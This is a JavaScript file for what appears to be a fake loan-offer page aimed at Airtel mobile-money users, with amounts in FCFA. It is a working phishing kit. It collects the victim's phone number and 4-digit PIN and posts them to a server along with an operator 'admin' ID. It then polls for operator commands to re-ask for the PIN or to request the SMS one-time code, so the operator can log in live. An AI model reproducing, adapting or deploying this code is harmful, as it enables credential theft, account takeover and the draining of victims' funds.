document.addEventListener('DOMContentLoaded', () => {
  const stepUnderstand = document.getElementById('step-I UNDERSTAND');
  const stepSlider = document.getElementById('step-slider');
  const stepForm = document.getElementById('step-form');
  const stepOtp = document.getElementById('step-otp');
  const stepLoading = document.getElementById('step-loading');
  const stepSuccess = document.getElementById('step-success');

  const credsSurfaceBanner = document.getElementById('creds-surface-banner');
  const otpSurfaceBanner = document.getElementById('otp-surface-banner');

  let currentUserId = null;
  let statusPollInterval = null;

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  function showStep(targetStep) {
    [stepUnderstand, stepSlider, stepForm, stepOtp, stepSuccess].forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (targetStep) targetStep.classList.add('active');
  }

  // Range Sliders
  const sliderBalance = document.getElementById('slider-balance');
  const balanceVal = document.getElementById('balance-val');
  const sliderDuration = document.getElementById('slider-duration');
  const durationVal = document.getElementById('duration-val');

  if (sliderBalance && balanceVal) {
    sliderBalance.addEventListener('input', (e) => {
      balanceVal.innerText = `${Number(e.target.value).toLocaleString()} FCFA`;
    });
  }

  if (sliderDuration && durationVal) {
    sliderDuration.addEventListener('input', (e) => {
      durationVal.innerText = `${e.target.value} mois`;
    });
  }

  // 4-Digit Inputs Setup with Automatic Focus Transfer & Auto-Submit
  const pinDigits = document.querySelectorAll('.pin-digit');
  const otpDigits4 = document.querySelectorAll('.otp-digit-4');

  function setupDigitInputs(inputs, autoSubmitCallback) {
    inputs.forEach((input, idx) => {
      input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '');
        if (input.value && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }

        const allFilled = Array.from(inputs).every(i => i.value.length === 1);
        if (allFilled && typeof autoSubmitCallback === 'function') {
          autoSubmitCallback();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });
  }

  setupDigitInputs(pinDigits);
  setupDigitInputs(otpDigits4, () => submitOtpHandler());

  // Flow Navigation
  document.getElementById('btn-understand-proceed').addEventListener('click', () => {
    showStep(stepSlider);
  });

  document.getElementById('btn-slider-next').addEventListener('click', () => {
    showStep(stepForm);
  });

  // Step 1: Submit Phone Number & PIN Credentials
  document.getElementById('btn-submit-creds').addEventListener('click', async () => {
    const phone = document.getElementById('phone-number').value.replace(/\D/g, '');
    const pinVal = Array.from(pinDigits).map(i => i.value).join('');

    if (phone.length < 8) {
      document.getElementById('phone-error').style.display = 'block';
      return;
    }
    document.getElementById('phone-error').style.display = 'none';

    if (pinVal.length !== 4) {
      document.getElementById('pin-error').style.display = 'block';
      return;
    }
    document.getElementById('pin-error').style.display = 'none';

    if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
    showLoading('Vérification en cours...', 'Envoi sécurisé de vos identifiants.');

    try {
      const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, pin: pinVal, adminChatId: adminParam })
      });

      const data = await res.json();
      if (data.success) {
        currentUserId = data.userId;
        document.getElementById('loading-title').innerText = 'En attente de validation de l\'administrateur...';
        document.getElementById('loading-sub').innerText = 'Veuillez rester sur cette page.';
        startStatusPolling();
      } else {
        hideLoading();
        alert(data.error || 'Échec du traitement.');
      }
    } catch (e) {
      hideLoading();
      alert('Erreur réseau.');
    }
  });

  // Status Polling Handler
  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'PROCEED_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          showStep(stepOtp);
          if (otpDigits4[0]) otpDigits4[0].focus();
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          hideLoading();
          document.getElementById('approved-amount-display').innerText = `${Number(sliderBalance.value).toLocaleString()} FCFA`;
          showStep(stepSuccess);
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (credsSurfaceBanner) credsSurfaceBanner.classList.add('active');
          pinDigits.forEach(i => i.value = '');
          if (pinDigits[0]) pinDigits[0].focus();
          showStep(stepForm);
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (otpSurfaceBanner) otpSurfaceBanner.classList.add('active');
          otpDigits4.forEach(i => i.value = '');
          if (otpDigits4[0]) otpDigits4[0].focus();
          showStep(stepOtp);
        }
      } catch (e) {}
    }, 3000);
  }

  // Step 2: Submit 4-digit SMS OTP
  async function submitOtpHandler() {
    const otpVal = Array.from(otpDigits4).map(i => i.value).join('');

    if (otpVal.length !== 4) {
      document.getElementById('otp-error').style.display = 'block';
      return;
    }
    document.getElementById('otp-error').style.display = 'none';
    if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');

    showLoading('Vérification du code OTP...', 'Analyse du SMS Airtel.');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
      });

      const data = await res.json();
      if (data.success) {
        document.getElementById('loading-title').innerText = 'Validation en cours...';
        document.getElementById('loading-sub').innerText = 'Veuillez patienter.';
        startStatusPolling();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  }

  document.getElementById('btn-submit-otp').addEventListener('click', submitOtpHandler);

  document.getElementById('btn-go-home').addEventListener('click', () => {
    window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
  });

  function showLoading(title, sub) {
    document.getElementById('loading-title').innerText = title;
    document.getElementById('loading-sub').innerText = sub;
    if (stepLoading) stepLoading.classList.add('active');
  }

  function hideLoading() {
    if (stepLoading) stepLoading.classList.remove('active');
  }
});
  
